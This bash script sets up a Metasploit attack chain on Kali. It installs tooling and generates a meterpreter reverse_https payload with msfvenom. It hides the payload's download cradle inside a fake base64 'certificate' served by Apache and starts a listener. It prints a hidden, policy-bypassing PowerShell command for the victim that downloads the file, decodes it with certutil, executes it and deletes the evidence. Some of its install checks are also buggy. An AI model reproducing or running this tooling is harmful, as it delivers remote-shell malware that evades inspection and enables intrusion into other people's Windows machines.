#!/bin/bash

##Things to do
#add pwsh installtion support
#add tmux session support
#add cme functionality
#add a super cool AsciiArt

#Works for kali
install_powershell() {
  echo "[*]Installing powershell please wait"
  ##add support for other OSs (ubuntu mainly)
  apt-get update
  apt-get install libunwind8 libicu55
  wget http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb8u6_amd64.deb
  dpkg -i libssl1.0.0_1.0.1t-1+deb8u6_amd64

  wget --no-check-certificate https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2-1.ubuntu.16.04_amd64.deb
  dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb

  # Start PowerShell
  pwsh -Version
  if [ $? -ne 1 ]; then
    echo "[!]Powershell installation failed"
    exit 1
  fi

  echo "[+]Powershell is installed"
}

install_tmux() {
  echo "[*]Installing tmux please wait"
  apt-get install tmux
  tmux -V
  if [ $? -ne 1]; then
    echo "[!]Tmux installation failed"
    exit 1
  fi
}

install_msf() {
  echo "[*]Installing metasploit....this could take a while, go grab some coffee"

  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall

  msfconsole --version
  if [ $? -ne 1]; then
    echo "[!]Metasploit installation failed"
    exit 1
  fi
}

install_apache() {
  echo "[*]Installing apache2..."
  apt-get install apache2

  apache2 -v
  if [ $? -ne 1]; then
    echo "[!]Apache installation failed"
    exit 1
  fi
}

craft_payload() {
  echo "0:Other..."
  x=1
  for addr in `hostname -I`
  do
    echo "$x:$addr"
    let x=x+1
  done

  read -p "[*]Please select the IP address of the listener and webserver: " a

  if [ $a = 0 ]; then
    read -p "[*]Please specifiy the address: " ip_addr
  else
    ip_addr=`hostname -I | cut -d" " -f${a}`
  fi

  read -p "[*]Enter port for the webserver[443]: " port
  port=${port:-'443'}
  read -p "[*]Enter web server root directory[/var/www/html]: " rootDir
  rootDir=${rootDir:-'/var/www/html'}
  echo "[+]Creating payload"
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_addr} LPORT=${port} -e cmd/powershell_base64 -f psh -o ${rootDir}/load.txt >> /dev/null
  export ip_addr;
  export port;
  export rootDir;

  service apache2 start
}

cradle_crafter() {
  echo "[+]Generating cradle"
  pwsh -command "import-module ./Invoke-CradleCrafter/Invoke-CradleCrafter.psd1; Invoke-CradleCrafter -Url 'http://${ip_addr}/load.txt' -Command 'Memory,Certutil,All,1,OUT ./raw.txt' -Quiet" >> /dev/null
}

craft_cert() {
  echo "[+]Crafting Certificate"
  echo "-----BEGIN CERTIFICATE-----" > ${rootDir}/cert.cer; cat raw.txt | base64 >> ${rootDir}/cert.cer; echo "-----END CERTIFICATE-----" >> ${rootDir}/cert.cer;rm raw.txt
}

start_listener() {
  echo "[+]Starting listener"
  sed -i "s/LHOST .*/LHOST ${ip_addr}/" reverse_https.rc
  sed -i "s/LPORT .*/LPORT ${port}/" reverse_https.rc

  ##Start this in tmux session
  tmux new -d -s "MetasploitListener" msfconsole -r reverse_https.rc

}


if [ "$EUID" -ne 0 ]
  then echo "[!]Please run as root"
  exit
fi

pwsh -Version >> /dev/null
if [ $? -ne 0 ]; then
  echo "[!]Powershell not installed..."
  install_powershell
fi

tmux -V >> /dev/null
if [ $? -ne 0 ]; then
  echo "[!]Tmux is not installed..."
  install_tmux
fi

msfconsole -V >> /dev/null
if [ $? -ne 0 ]; then
  echo "[!]Metasploit is not installed..."
  install_msf
fi

apache2 -v >> /dev/null
if [ $? -ne 0 ]; then
  echo "[!]Apache is not installed..."
  install_apache
fi

##Generate the payload
craft_payload

##Start powershell and invoke cradleCrafter
cradle_crafter

##Craft certificate
craft_cert

##Output final notations
echo "[+]Certificate located at ${rootDir}/cert.cer or ${ip_addr}/cert.cer"
echo "[+]Command to run on target: "
echo "  powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 & start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\cert.cer"
echo "powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stage.ps1 & start /b cmd /c powershell.exe  -Exec Bypass -NoExit -File %APPDATA%\stage.ps1 & start /b cmd /c del %APPDATA%\cert.cer" > command.txt
start_listener
